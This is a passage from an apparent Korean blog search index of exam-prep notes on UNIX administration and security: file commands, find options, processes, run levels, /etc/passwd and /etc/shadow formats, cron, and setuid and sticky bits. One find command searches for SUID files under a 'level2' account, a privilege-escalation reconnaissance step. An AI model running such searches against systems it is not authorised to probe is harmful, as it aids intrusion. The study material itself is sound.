스캐너, 키보드, 프린터 등       l : 심볼릭 링크파일       p : 파이프 파일                           : 일반 / 정규파일                       s : UNIX 소켓 파일           파일 관련 명령어            cd : 디렉터리 간 이동                    / : 절대경로 (루트 디렉터리 기준)           . : 상대경로 (현재 디렉터리 기준)                       pwd : 현재 디렉터리 확인       mkdir : 새로운 디렉터리 생성                    mkdir -p a/b : 계층구조 한번에 생성                       rmdir : 기존 디렉터리 삭제                    rmdir -p aa/bb : 계층구조 한번에 삭제, 하위 디렉터리나 파일이 없어야 함.                       mv : 파일 이동                    mv text1 data1 : 파일명 변경 (덮어쓰기)           mv text1 directory1 : 파일 이동           mv a/test.c a/test2.c directory1 : 여러개 파일 이동                       cp : 파일 복사       rm : 파일 삭제                    -r : 디렉터리 삭제                       ln : 파일 링크           파일 권한 관리 관련 명령어            chmod : 접근권한 변경                    슈퍼유저 (root), 해당 파일 소유자 만 변경 가능           u : user / g : group / o : others / a : all           r : read(4) / w : write(2) / x : execute(1)                                       : add / - : remove / = : assign                                   chmod g+x test.c : test.c 의 그룹에 실행권한 추가           chmod a=rw test.c : test.c 의 모든사용자에 읽기/쓰기권한 설정           chmod 777 test.c : 모든사용자에게 rwx 권한을 부여                       chown : 소유자 변경                    슈퍼유저 (root) 만 명령어 사용 가능           chown root test.c           chown -R 소유자 디렉터리  : 디렉터리 하위 모두 적용           -h : 심볼릭링크 자체의 소유자 변경                       chgrp : 소유 그룹 변경                    슈퍼유저 (root) 만 명령어 사용 가능                       umask : 접근권한 마스크                    앞으로 생성될 파일에 대한 접근권한 지정           /etc/profile 에서 umask 지정           umask 0022 : 명령어를 통해 0022 로 지정           0022 일 경우                            파일 : 666-022 = 644               폴더 : 777-022 = 755                                               touch                    touch test.c           (파일이 없을 때) 비어있는 파일을 생성           (파일이 존재할때) 시간이 변경됨                            touch -m 파일명 : modify + change               touch -a 파일명 : access + change               touch -c 파일명 : 파일이 없으면 생성하지 않는다.                                                   파일 검색            find [찾을 디렉터리 경로] [찾기 옵션]       디렉터리 경로                    / : 루트에서 검색 (시스템 전체)           . : 현재 디렉터리를 포함하여 하위 디렉터리까지 검색           /directory : 지정된 디렉터리에서 검색                       옵션                    -name [파일이름(정규식)] : 파일명 또는 확장자 기준 검색           -perm [권한] : 권한과 일치하는 파일                            find / -user level2 -perm -4000 : -(최소한), 4(SetUID) 가 걸려있는 모든 파일을 검색                                    SetUID : 해당 파일을 실행할 때 파일 소유자의 권한으로 실행                   RUID/RGID : 실제 명령을 수행한 사용자의 UID/GID                   EUID/EGID : 명령을 실행중인 동안의 UID/GID                                               find . -perm -1 -print : 기타 사용자 실행권한이 있는 모든 파일 검색                                   -user [유저] : 소유자 일치           -group [그룹] : 그룹 일치           -empty : 비어있는 파일이나 디렉터리 검색           -size [+파일크기/-파일크기/파일크기] [bckmgw중 택1] : 파일크기와 일치하는 파일                            b : 블록단위 512kb (디폴트)               c : byte               k : kbyte               w : 2byte 워드                                   -type [파일타입] : 파일의 타입을 지정하여 검색                            b : 블록 특수 파일 (block device) - Random Access 가능 (HDD,CD-ROM)               c : 캐릭터 특수 파일 (character device) - 프린터 등               d : 디렉터리 (directory)               f : 일반파일 (file)               l : 심볼릭 링크(link)               p : 파이프(pipe)               s : 소켓(socket)                                   -print : 찾은 파일들을 표준출력(stdout-모니터)으로 출력, 기본값           -nouser : 소유자가 없는 파일을 검색 (/etc/passwd 파일에 없는 사용자)           -nogroup : /etc/groups 파일에 없는 그룹           -fprint [임의파일명] : 검색 결과를 임의 파일에 출력           -exec [command] {} \\ : 파일이 검색되었을 경우, 검색된 파일들에 대해 특정 명령 수행                            {} : 검색된 파일을 의미. 여러 개의 파일이 검색되면 하나씩 치환되면서 해당 명령어를 수행               ; : 검색된 결과가 여러개인 경우 하나의 행에 여러 명령을 사용하기 위함               \\ : ; 이 특수문자이기 때문에 문자로 ;라는 것을 알려주기 위함               find . -name kkk* -exec rm {} \\; : kkk로 시작하는 파일을 검색하여 삭제               -ok : -exec와 동일한 작업, 단, 실행할 때마다 실행 의사를 물어봄               MAC Time 조회                                    find -type f -mtime -1 -exec ls -al {} \\;                   + : n일 초과                   - : 1일 미만                                               용량 조회                                    find -type f -size +5M -exec ls -al {} \\;                   b : default (block)                   c : bytes                   k : kb                   M : mb                   G : gb                                                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-system-connect/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 프로세스 식별자 및 정보 확인",
        "excerpt":"프로세스 식별자      프로세스 : 실행중인 프로그램   프로세스 식별자 : PID   프로세스 생성 과정            OS 부팅 되면서 초기 시스템 프로세스를 생성                    0 : swapper (sched) - 커널 프로세스 (커널은 메모리에 상주)                            exec(), fork() 를 수행하여 아래 프로세스 생성                                   1 : init - 시스템 내의 모든 프로세스의 조상 프로세스                            부모프로세스가 죽고 자식 프로세스가 남은 경우 init이 부모 역할을 함                                   2 : pagedaemon - 커널 프로세스 (커널은 메모리에 상주)           exec() : 자신의 현재 코드, 자료, 실행 가능한 다른 코드, 스택 등으로 치환           fork() : 자식 프로세스에게 부모의 코드와 자료, 스택영역 할당                           CPU 1개 = 실행 가능한 프로세스 1개            커널은 CPU(자원)을 골고루 나눠 쓸 수 있도록 스케줄링을 함       프로세스들은 필연적으로 상태 전이가 일어남                    CPU 사용권을 할당 받아 실행중인 상태           CPU 사용권을 반납하고 대기 중인 상태                       실행중인 프로세스는 누구나 정보를 확인할 수 있음       프로세스 종료는 수퍼유저(root) 또는 프로세스를 실행한 사용자로 제한           프로세스 자료구조      ps [option] : 프로세스에 대한 정보 출력            -f : 프로세스 정보를 한 줄씩 출력       -l : f 옵션보다 더 많은 정보를 출력       -e : 현재 시스템에서 실행중인 모든 프로세스의 정보를 출력           PCB (프로세스 제어블록) (시스템)            프로세스 상태정보                    ready           running           blocked                       프로세스 번호 (PID)       프로그램 카운터 : 컨텍스트 스위칭이 일어날 때 다음에 실행할 명령어 위치값 저장       레지스터 : 컨텍스트 스위칭이 일어날 경우 현재 프로세스의 실행상태 정보       메모리 정보                    page, segment table                           FDT (File Descripter Table) (시스템)            프로세스들이 오픈한 파일들을 관리하기 위한 테이블       개별 프로세스별로 생성       stdin : 표준 입력       stdout : 표준 출력       stderr : 표준 에러       사용 파일들 (File Descripter)                    숫자값 : 오픈한 파일을 구별하기 위한 식별자                           System Open File Table (커널)            오픈된 파일을 관리하기 위한 테이블       커널/운영체제에서 관리       open mode                    읽기 (read)           쓰기 (write / append)                       offset                    입력, 출력을 수행하기 위한 위치값                       reference count                    해당 파일의 참조 개수                           Active vnode table (커널)            i-node 를 관리하기 위한 캐시 테이블           프로세스의 종류      0 (swapper) : boot process, 시스템 부팅 담당   1 (init)   orphan process : 부모 프로세스가 먼저 죽은 경우            init 프로세스가 부모 역할을 함           예: test 실행            init 프로세스 fork() -&gt; exec()       부모프로세스(pid:20) 생성 -&gt; 자식 프로세스(pid:21) 생성                    kill -9 [pid] : 강제종료           kill -9 20 : 부모프로세스 강제종료           자식프로세스의 ppid 는 1 (init) 이 됨           프로세스 강제종료시에는 자신의 종료상태정보를 부모프로세스에게 모두 반환해야 정상종료됨.                            pid, exit code, cpu time                                   부모프로세스가 종료상태정보를 확인 -&gt; 자식프로세스 소멸           부모프로세스가 종료상태정보를 미확인 -&gt; 자식프로세스가 남아있게 됨 (좀비 프로세스)                            모든 프로세스는 종료 시 일시적으로 좀비프로세스 상태를 거침               자식 프로세스의 종료 사실을 커널이 알리고 부모 프로세스가 확인하는 동안은 좀비 상태가 됨                                   좀비프로세스가 많아지면 더이상 프로세스 생성 X                            kill 명령어로도 제거 불가               부모프로세스가 확인 혹은 재부팅해야 함               ps -l 로 프로세스 확인할 경우                                    필드 : F S PRI NI ADDR SZ WCHAN                   F 필드 : 프로세스 플래그                                            1 : fork() 로 생성, exec() 미실행                       4 : 슈퍼유저로 실행                                                           S 필드 : 프로세스의 현재 상태                                            S : Inturrupt 가능 Sleep 상태                       R : Run / Ready / Runnable 상태                       Z : Zombie 상태                       D : Inturrupt 불가능 Sleep 상태 (I/O 대기)                       T : Stop 상태 (프로세스 정지)                                                           PRI 필드 : 프로세스의 우선순위                                            수치가 낮을수록 우선순위 높음                                                           NI 필드 : 프로세스 우선순위 근거                   ADDR 필드 : 메모리 주소                   SZ 필드 : 프로세스가 차지하는 메모리 크기                   WCHAN 필드 : Sleep 상태 프로세스가 대기하는 커널의 함수명                                                                                   System Call      메모리            Stack       Heap       Data       Code           프로세스            실행중인 프로그램       프로그램의 instance (복제물)       프로그램 호출한 프로세스를 fork() -&gt; exec() 로 프로그램 코드 대체           fork() : 복제            메모리의 Stack, Heap, Data, Code 영역을 복제. pid 값은 다름.       원본 : 부모, 복제물 : 자식           exec() : 대체            fork() 에 의해 복제된 자식 프로세스의 코드영역을 다른 내용으로 덮어씀.           프로세스 그룹            프로세스 생성 -&gt; 프로세스 그룹 생성 (실행프로세스 - 자식프로세스들)       커널이 터미널 제어권을 관리하기 위함                    터미널 제어권 : 입력되는 시그널 등을 관리           중앙 서버와 A 터미널 연결 (Session)           Session 내 A1 프로세스 그룹, A2 프로세스 그룹이 있을 경우           A1 프로세스 그룹이 터미널에 대한 제어권을 가질 경우 : 포그라운드모드 (유일)                            PGID : A1 프로세스의 대표되는 프로세스 PID, 쉘을 실행시킨 PID                                   A2 프로세스 그룹이 터미널에 대한 제어권이 없을 경우 : 백그라운드모드                           ps -ef            CMD 컬럼 : 프로세스명       C 컬럼 : CPU의 사용량 - 스케줄링에 영향 (잘 사용되지 않음)       STIME : 프로세스 시작 시간       TTY : 프로세스와 연결된 터미널       TIME : CPU 사용시간           프로세스간 통신 (InterProcess Communication)            시그널                    외부           에러           이벤트           인위적                       Pipe : ps -ef | grep tomcat       Message Queue       공유메모리       세마포어           kill [-signal number or name] [PID] : 시그널            kill -9 1000 : PID 1000번 프로세스 종료 시그널       SIGKILL(9) : 프로세스 종료 시그널(무시, 임의처리 불가)       SIGSTOP(23) : 프로세스 정지 시그널 (무시, 임의처리 불가)           시그널 통신을 사용하는 경우            데몬 프로세스의 정상적인 종료를 위해       데몬 프로세스의 환경 설정 파일을 수정하기 위해       프로그램을 디버깅하기 위해       프로세스 간의 동기화를 위해       커널과 시스템 관리자는 모든 프로세스에게 시그널을 보낼 수 있지만, 일반 프로세스는 동일한 UID 와 GID 를 갖는 프로세스 또는 같은 프로세스 그룹 내의 프로세스에게만 시그널을 보낼 수 있음           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-process/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 런레벨, 사용자 관리",
        "excerpt":"유닉스의 시작과 종료   부팅 관련 용어      런 레벨 (Run Level)            시스템의 운영 상태를 숫자나 문자로 표현한 것       필요 시 유닉스 부팅을 변경하여 네트워크 사용을 못하게 하거나 다른 사용자의 접근을 막음           /etc/inittab 파일            init 프로세스       모든 프로세스의 부모 프로세스       /etc/inittab 파일에 저장 되어 있는 스크립트 대로 프로세스들을 생성       /etc/inittab 파일에 정의된 레벨에 따라 /etc/rc.d/rc[런레벨].d 디렉터리에 나열된 스크립트를 실행하여 시스템의 운영상태를 구성                                      런 레벨           상태           설명                                           0                       PROM(Programmable Read-Only Memory) 감사 단계                             1           부팅 직후 상태           ⦁ 관리상태 단계. 사용자 로그인의 접근이 불가능한 단일 사용자 단계. 로컬 파일 시스템이 마운트 된 상태 상태 ⦁ 암호를 변경할 때 사용                             2           정상 상태           ⦁ 공유 자원을 갖지 않은 다중 사용자 단계 ⦁ 멀티 유저 모드(NFS 클라이언트 모드)                             3           정상 상태           기본 실행단계로 자원을 가진 다중 사용자 단계, 텍스트 유저모드 ⦁ 멀티 유저 모드(NFS 서버 모드), UNIX 기본 Run Level                             4                       현재 사용되지 않음                             5           ⦁ 유닉스:종료상태 ⦁ 리눅스:정상상태           ⦁ 시스템 power off 모드 ⦁ Run Level 3로 기동 후에 그래픽 모드인 X-Windows 를 실행                             6           재부팅           재부팅 단계로 실행단계 3의 상태로 재부팅                             S,s                       시스템 싱글 유저 모드, 로컬 파일 시스템이 마운트 되지 않은 상태                                  명령어                    init S : 시스템 유지보수           UNIX                            shutdown -y -g 0 -i 5 : System V, 유닉스 시스템 종료                                    -y : 질의에 yes                   g 0 : 초단위 대기시간 0초, default 60초                   i 5 : init 런레벨 5                                               shutdown -y -g 20 -i 6 \"server reboot\"                                    20초 후에 서버 리부팅, “server reboot” 메시지 전송                                                                   BSD &amp; 리눅스                            shutdown -h : halt, PROM 상태 (하드웨어 점검 후 ROM에 접근 )               shutdown -r +10 : reboot (10분후)               shutdown -k : reboot (fake)               shutdown -f : fast reboot                                                   INIT 상태 (INIT State)            init 상태 = 런 레벨       init 명령 : 시스템이 런 레벨을 이동할 때 사용           UNIX 시스템 시작 (부팅과정)            Bios 과정                    시스템의 기본적인 자원, 하드웨어 이상 탐지, 정보 수집 (PROM)                       Boot Program 과정                    하드디스크에서 커널을 읽어들여 메모리에 로딩                       Kernel 과정                    커널이 시스템 제어권을 넘겨받아 운영체제가 구동되는 과정           시스템 운영을 위한 초기화 작업                       init 과정                    커널에 의해서 생성되는 첫 번째 프로세스                           BSD 계열            싱글유저모드, 멀티유저 모드           System V 계열            0, 1, 2, 3, 4, 5, 6, s (런레벨)           하드 디스크 동기화(Sync)            UNIX 시스템은 하드 디스크의 입,출력에 대한 효율성을 높이기 위해 버퍼를 운영       시스템 비정상적으로 종료시 버퍼 내용이 미반영, 파일 시스템에서 무결성 문제 발생       유닉스나 리눅스 종료 시 sync 명령을 내리는 이유          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-run_level_and_user/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 사용자 관리",
        "excerpt":"유닉스 사용자 관리      사용자 계정 관리            useradd, adduser : 사용자 계정 추가                    useradd [계정명] : root 권한 수행           passwd : 비밀번호 설정           홈 디렉터리 생성           접근권한 추가           사용자 로그인 시 필요한 시작파일을 홈디렉토리에 생성                       usermod : 사용자 계정 변경       userdel : 사용자 계정 삭제                    userdel -r [유저명] : 사용자 계정 삭제 + 홈디렉터리 삭제                       /etc/passwd : 사용자 계정정보       /etc/shadow : 암호화된 비밀번호           그룹 관리            groupadd : 그룹 추가                    groupadd -g 520 test : gid 520인 test 그룹 생성                       groupdel : 그룹 삭제       /etc/group : 그룹 정보          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-user_management/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 파일시스템 관리",
        "excerpt":"파일 시스템 관리      파일 시스템 연결            장치들은 UNIX 시스템이 의해 인식되어야 사용할 수 있음       mount 명령은 보조기억장치에 설치된 파일 시스템을 UNIX 시스템이 인식하도록 특정 디렉토리에 논리적으로 연결시켜 줌       명령 형식 : mount [-option] [device] [mount_point] ;       옵션                    -a : /etc/fstab 파일에 정의된 모든 파일 시스템을 마운트           -t : 파일 시스템의 형식을 지정                            윈도우 계열                                    vfat : fat, fat32, fat16                   ntfs                                                                   -n :/etc/mtab 파일에 정보를 남기지 않고 마운트                       디바이스                    /dev/hda1, /dev/hda2, …                       mount -t vfat /dev/hda1 /mnt/win98 ;           자동 마운트 설정 : fstab            파일 경로 : /etc/fstab       UNIX 시스템이 부팅시 이 파일을 참조하여 마운트 작업을 자동으로 수행       mount -a : /etc/fstab 에 저장된 정보를 기반으로 명시적 실행       /etc/mtab : 파일 시스템이 mount 되거나 해제 될 때마다 mount 프로그램에 의해 업데이트 되는 일반 파일           파일 시스템 연결 해제 : umount            명령 형식 : umount [-option] [device| mount_point] ;       사용중이거나 사용자가 해당 디렉터리에 있다면 unmount 명령은 “device is busy” 메시지와 함께 실패한다.       옵션                    -a : 마운트된 모든 파일 시스템을 언마운트           -f : 해당 파일 시스템을 사용하는 프로세스를 강제로 종료하고 파일 시스템을 언마운트                           파일 시스템 관리 : du, df            du : 디렉터리의 하드디스크 사용량을 확인       명령 형식 : du [-option] [directory_name] ;       옵션                    -a : 디렉터리 및 하위 파일정보까지 출력 (All)           -s : 현재 디렉터리가 사용중인 용량만 출력 (Summary)           -k : 사용량을 KB 단위로 출력                       디렉터리를 명시하지 않을 경우 현재 디렉터리를 기준으로 한다.       df : 파일 시스템의 전체 공간 및ㅊ 사용 가능 공간에 대한 정보       명령 형식 : df [-option] [file_system | file] ;       옵션                    -k : 통계 데이터를 KB 단위로 출력           -i : 파일 시스템의 사용가능 또는 사용중인 i-node 정보를 출력                       file_system 인수는 파일 시스템 장치명 또는 마운트 디렉터리를 의미          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-file_system_management/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 프로세스 스케쥴 관리",
        "excerpt":"프로세스 스케쥴 관리      데몬 프로세스            UNIX 시스템 (서버용) 프로세스 특징 : 데몬 프로세스                    백그라운드 모드로 실행           제어 터미널(포그라운드 모드)을 갖지 않는다.           클라이언트 요구가 있을 때까지 CPU 사용권 반납, 블록           클라이언트 요구가 있을 때 깨어나 해당 작업을 처리 후 블록           시스템 셧다운 전까지 종료되지 않는다.                           정기적 스케쥴 관리 : cron            cron 데몬 프로세스는 UNIX 시스템에서 정기적인 작업을 지정한 시간에 처리하기 위해 사용       세 가지 구성 요소가 필요                    정기적으로 처리할 작업 목록을 정의한 crontab 파일           crontab 파일을 제어하는 crontab 명령           crontab 파일을 읽어서 내용에 정의된 대로 작업을 처리하는 cron 데몬 프로세스                       사용자가 crontab 명령어로 crontab 파일을 제어 -&gt; cron 데몬 프로세스가 작업을 실행       crontab 파일 : 정기적으로 처리해야 하는 작업 목록을 정의한 파일                    분 시 일 월 요일(0~6/일~토) 사용자 실행명령                            30 3 * * 2 root /home/clean.sh : 매주 화요일 3시 30분에 /home/clean/sh 명령을 실행               */10 2-5 * * * root /home/user/abc : 매일 2-5시 까지 10분마다 실행               0 7 1 1-10/2 * /bin/vipcheck.sh : 1-10월 두 달 주기로 1일 7시에 실행               0 3,5,7 * * * batch.sh : 매일 3,5,7 시               0 8-10 * * * batch.sh : 매일 8,9,10 시                                               crontab 옵션                    -l : 현재 로그인 된 계정에 잡혀있는 작업 스케줄 확인           -e : 현재 로그인 중인 계정에 작업을 등록           -r : 현재 crontab에 등록된 작업을 삭제           -u &lt;USER명&gt; : 작업을 실행시킬 유저명 설정                            유닉스의 경우 crontab [-option] [user];                                   주의사항 : crontab 명령 실행 시 현재 입력되는 내용으로 덮어씀.                       사용자 별 crontab 파일이 존재                    root는 계정별 crontab 파일 편집이 가능           crontab [-u user] [-e] : 계정에 해당되는 crontab 파일 편집/생성           crontab -u kim -l : kim 계정의 crontab 파일 출력                       crontab 접근통제를 위한 파일                    /etc/cron.allow : cron 명령어 사용 가능 사용자           /etc/cron.deny : cron 명령어 사용 불가 사용자           파일이 둘 다 있는 경우 cron.allow 로 적용           파일이 둘 다 없는 경우 root 만 crontab 명령 실행                           일시적 스케줄 관리 : at            작업을 정해진 시간에 한 번만 실행       명령 형식 : at [-option] [time_date];       옵션                    -t time_date : 작업 시간을 지정           -l : 현재 대기중인 작업 목록 출력           -r job_id : job_id 에 해당하는 작업을 목록에서 삭제 (UNIX)           -d job_id ; job_id 에 해당하는 작업을 목록에서 삭제 (LINUX)                       at 사용법                    at 데몬 시작 : /etc/init.d/atd start           작업 시간 및 작업 내용을 지정                            at 6:00 pm               at) /usr/local/apache/bin/apachectl restart               at) : Ctrl + D 저장               at 6pm +2days : 이틀 후 오후 6시               at 2pm tomorrow : 내일 오후 2시               at 11am jul 20 : 6월 20일 오전 11시                                   예약 작업 확인                            at -l 또는 atq                                   예약 작업 삭제                            atrm &lt;job_id&gt;               at -r &lt;job_id&gt;                                               접근통제                    /etc/at.allow : 화이트리스트           /etc/at.deny : 블랙리스트                           파일 시스템 연결            장치들은 UNIX 시스템이 의해 인식되어야 사용할 수 있음       mount 명령은 보조기억장치에 설치된 파일 시스템을 UNIX 시스템이 인식하도록 특정 디렉토리에 논리적으로 연결시켜 줌       명령 형식 : mount [-option] [device] [mount_point] ;       옵션                    -a : /etc/fstab 파일에 정의된 모든 파일 시스템을 마운트           -t : 파일 시스템의 형식을 지정                            윈도우 계열                                    vfat : fat, fat32, fat16                   ntfs                                                                   -n :/etc/mtab 파일에 정보를 남기지 않고 마운트                       디바이스                    /dev/hda1, /dev/hda2, …                       mount -t vfat /dev/hda1 /mnt/win98 ;           자동 마운트 설정 : fstab            파일 경로 : /etc/fstab       UNIX 시스템이 부팅시 이 파일을 참조하여 마운트 작업을 자동으로 수행       mount -a : /etc/fstab 에 저장된 정보를 기반으로 명시적 실행       /etc/mtab : 파일 시스템이 mount 되거나 해제 될 때마다 mount 프로그램에 의해 업데이트 되는 일반 파일           파일 시스템 연결 해제 : umount            명령 형식 : umount [-option] [device| mount_point] ;       사용중이거나 사용자가 해당 디렉터리에 있다면 unmount 명령은 “device is busy” 메시지와 함께 실패한다.       옵션                    -a : 마운트된 모든 파일 시스템을 언마운트           -f : 해당 파일 시스템을 사용하는 프로세스를 강제로 종료하고 파일 시스템을 언마운트                           파일 시스템 관리 : du, df            du : 디렉터리의 하드디스크 사용량을 확인       명령 형식 : du [-option] [directory_name] ;       옵션                    -a : 디렉터리 및 하위 파일정보까지 출력 (All)           -s : 현재 디렉터리가 사용중인 용량만 출력 (Summary)           -k : 사용량을 KB 단위로 출력                       디렉터리를 명시하지 않을 경우 현재 디렉터리를 기준으로 한다.       df : 파일 시스템의 전체 공간 및ㅊ 사용 가능 공간에 대한 정보       명령 형식 : df [-option] [file_system | file] ;       옵션                    -k : 통계 데이터를 KB 단위로 출력           -i : 파일 시스템의 사용가능 또는 사용중인 i-node 정보를 출력                       file_system 인수는 파일 시스템 장치명 또는 마운트 디렉터리를 의미          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-process_schedule_management/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 패스워드 관리",
        "excerpt":"유닉스 사용자 패스워드 관리      /etc/passwd            user_account : user_passwd : user_id : group_id : comment : home_directory : login_shell                    user_passwd : X 는 shadow 파일을 이용한다는 의미           user_id : 0 일 경우 root           group_id : 0 일 경우 관리자 그룹           login_shell : 로그인 계정이 아닌 경우 (시스템계정)                            /sbin/nologin               /bin/false                                                   /etc/shadow            user_account : encrypted_password : last_change : minlife : maxlife : warn : inactive : expires :                    encrypted_password : $1$xdBAee04$z1FE9wTQ0cXiFFU7E0gB                            $ + 1 : id                                    해시 알고리즘의 종류                   1 : MD5                   2 : BlowFish                   5 : SHA256                   6 : SHA512                                               $ + xdBAee04 : salt                                    같은 비밀번호여도 salt 값이 다르면 다른 패스워드 생성                                               $ + z1FE9wTQ0cXiFFU7E0gB : encrypted-password               리눅스                                    정상암호                   특수문자 * 로 표기 : 패스워드가 잠긴 상태여서 로그인 불가하나 다른 방법으로 로그인할 수 있음 (예: SSH)                   특수문자 !! 로 표기 : 사용자 계정 생성을 하였으나 패스워드 미생성                   !! + $1$xdBAee04$z1FE9wTQ0cXiFFU7E0gB : 패스워드 잠겨서 로그인불가                                            passwd -l [계정명] : 패스워드 락                       passwd -u [계정명] : 패스워드 언락                                                           비어있는 경우 : 패스워드 미설정, 패스워드 없이 로그인 가능                                               유닉스                                    정상암호                   NP : No Password &gt; 로그인 불가 계정 (시스템 계정 등)                   *LK* : Lock &gt; 패스워드가 잠긴 상태                   비어있는 경우 : 패스워드 미설정, 로그인 시 패스워드 설정작업진행                                                                   last_change : 마지막 수정일 (1970년 1월 1일부터 경과일 수)           minlife : 패스워드 최소 사용기간 (변경 이후 변경불가 일수)           maxlife : 패스워드 최대 사용기간 (예: 90일)           warn : 패스워드 만료 이전 경고일수           inactive : 계정이 잠기기 전까지 비활성화 일수                            리눅스 : 비활성화 일수 동안 패스워드 미변경 시 잠김               유닉스 : 비활성화 일수 동안 로그인을 하지 않으면 잠김                                   expires : 계정 만료일 (1970년 1월 1일부터 경과일 수)                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-password_management/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 프로세스 실행권한",
        "excerpt":"유닉스 프로세스 실행권한      프로세스에 부여되는 번호            프로세스 식별자(PID)       실제 사용자 ID(RUID)       유효 사용자 ID(EUID)       실제 사용자 그룹(RGID)       유효 사용자 그룹(EGID)           사용 용도            계정 관리에 사용 : RUID, RGID       접근 권한 결정에 사용 : EUID, EGID (보안상 주의를 요함)       일반적으로 실제 번호와 유효 번호는 동일함       동일하지 않은 경우 : setUID, setGID           시스템에서 사용자가 명령 실행 시 명령어를 찾는 경로와 절차            현재 디렉터리 확인       명령어 없으면 $PATH 에서 명령어 찾기       명령어가 있으면 실행권한 확인                    실행권한 있으면 명령어를 실행시킨 사용자 ID로 명령어 실행           실행권한이 없으면 명령파일에 setUID 가 설정되어 있는지 확인                            소유주 권한으로 명령어 실행                                                   UNIX 시스템 파일 접근권한            UNIX 시스템은 파일에 대한 접근 권한, 파일 종류를 나타내기 위해 16bit 사용       4bit 는 파일의 종류 표현에 사용       3bit 는 특수권한에 사용       user, group, other 에 9bit 사용           특수권한            setuid : 4, setgid : 2, sticky bit : 1       설정 예                    aaa rwxr-xr-x : 755                            chmod 4755 aaa, chmod u+s aaa : setUID               chmod 2755 aaa, chmod g+s aaa : setGID               chmod 6755 aaa, chmod ug+s aaa : setUID + setGID                                               실행 예                    ls -al aaa : rwxr-xr-x           id 의 결과가 uid : 502, gid : 506                            $aaa                                    RUID:502, EUID:502, RGID:506, EGID:506                                                                   #chmod ug+s aaa           ls -al aaa : rwsr-sr-x           aaa 의 소유자가 root 라고 가정                            $aaa                                    RUID:502, EUID:0, RGID:506, EGID:0                                                                                   setUID 의 보안상 문제점            root 권한이 필요없는 프로그램의 소유주가 root 이고 setUID 가 설정된 경우 취약       find . -user root -perm -4000       chmod -s aaa : setUID, setGID 모두 제거           passwd 명령어            ls -l /etc/passwd : -rw-r–r– root root                    644 권한, 패스워드 보관 파일                       ls -l /usr/bin/passwd : -r-s–x–x root root                    4511 권한, 패스워드 변경 명령어 (root권한 이용)           /etc/shadow 파일 변경                           Sticky-bit            대부분 /tmp 디렉터리에 설정 (공유디렉터리 : tmp, /var/tmp)       rwxrwxrwx : 모든 사용자들이 모든 권한을 가지게 됨                    다른 사람이 생성한 파일을 수정하거나 삭제할 수 있음           파일을 자유롭게 생성하되, 수정, 삭제는 소유자만 가능하게 하고 싶음                       모든 사용자가 write 가능, 생성된 파일은 write 한 사용자의 소유       chmod 1777 /tmp, chmod o+t /tmp (리눅스) / chmod u+t /tmp (SunOS)                    rwxrwxrwt                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","UNIX"],
        "url": "https://bluesplatter.com/is_certification/IS-Unix-process_auth/",
        "teaser": null
      },{
        "title": "정보보안 - 유닉스 특수권한",
        "excerpt":"유닉스 프로세스 실행권한      프로세스에 부여되는 번호            프로세스 식별자(PID)       실제 사용자 ID(RUID)       유효 사용자 ID(EUID)       실제 사용자 그룹(RGID)       유효 사용자 그룹(EGID)           사용 용도            계정 관리에 사용 : RUID, RGID       접근 권한 결정에 사용 : EUID, EGID (보안상 주의를 요함)       일반적으로 실제 번호와 유효 번호는 동일함       동일하지 않은 경우 : setUID, setGID           시스템에서 사용자가 명령 실행 시 명령어를 찾는 경로와 절차            현재 디렉터리 확인       명령어 없으면 $PATH 에서 명령어 찾기       명령어가 있으면 실행권한 확인                    실행권한 있으면 명령어를 실행시킨 사용자 ID로 명령어 실행           실행권한이 없으면 명령파일에 setUID 가 설정되어 있는지 확인                            소유주 권한으로 명령어 실행                                                   UNIX 시스템 파일 접근권한            UNIX 시스템은 파일에 대한 접근 권한, 파일 종류를 나타내기 위해 16bit 사용       4bit 는 파일의 종류 표현에 사용       3bit 는 특수권한에 사용       user, group, other 에 9bit 사용           특수권한            setuid : 4, setgid : 2, sticky bit : 1       설정 예                    aaa rwxr-xr-x : 755                            chmod 4755 aaa, chmod u+s aaa : setUID               chmod 2755 aaa, chmod g+s aaa : setGID               chmod 6755 aaa, chmod ug+s aaa : setUID + setGID                                               실행 예                    ls -al aaa : rwxr-xr-x           id 의 결과가 uid : 502, gid : 506                            $aaa                                    RUID:502, EUID:502, RGID:506, EGID:506                                                                   #chmod ug+s aaa           ls -al aaa : rwsr-sr-x           aaa 의 소유자가 root 라고 가정                            $aaa                                    RUID:502, EUID:0, RGID:506, EGID:0                                                                                   setUID 의 보안상 문제점            root 권한이 필요없는 프로그램의 소유주가 root 이고 setUID 가 설정된 경우 취약       find . -user root -perm -4000       chmod -s aaa : setUID, setGID 모두 제거           passwd 명령어            ls -l /etc/passwd : -rw-r–r– root root                    644 권한, 패스워드 보관 파일                       ls -l /usr/bin/passwd : -r-s–x–x root root                    4511 권한, 패스워드 변경 명령어 (root권한 이용)           /etc/shadow 파일 변경                           Sticky-bit            대부분 /tmp 디렉터리에 설정 (공유디렉터리 : tmp, /var/tmp)       rwxrwxrwx : 모든 사용자들이 모든 권한을 가지게 됨                    다른 사람이 생성한 파일을 수정하거나 삭제할 수 있음           파일을 자유롭게 생성하되, 수정, 삭제는 소유자만 가능하게 하고 싶음                       모든 사용자가 write 가능, 생성된 파일은 write 한 사용자의 소유       chmod 1777 /tmp, chmod o+t /tmp (리눅스) / chmod u+t /tmp (SunOS)                    